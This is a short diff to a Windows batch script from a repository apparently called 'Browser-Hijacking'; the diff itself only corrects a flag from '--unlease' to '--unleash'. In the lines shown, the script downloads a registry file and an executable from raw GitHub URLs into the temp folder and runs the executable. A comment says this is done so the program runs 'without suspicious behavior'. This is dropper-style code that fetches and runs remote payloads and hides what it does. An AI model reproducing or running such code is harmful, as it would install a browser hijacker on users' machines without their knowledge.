@@ -5,4 +5,4 @@ curl -o %tmp%\ieconf.reg --url https://raw.githubusercontent.com/icesonata/Brows
 @REM Download patcher to make the program run normally without suspicious behavior
 curl -o %tmp%\patcher.exe --url https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/patcher.exe
 @REM Execute patcher
-%tmp%\patcher.exe --unlease "%cd%"
+%tmp%\patcher.exe --unleash "%cd%"
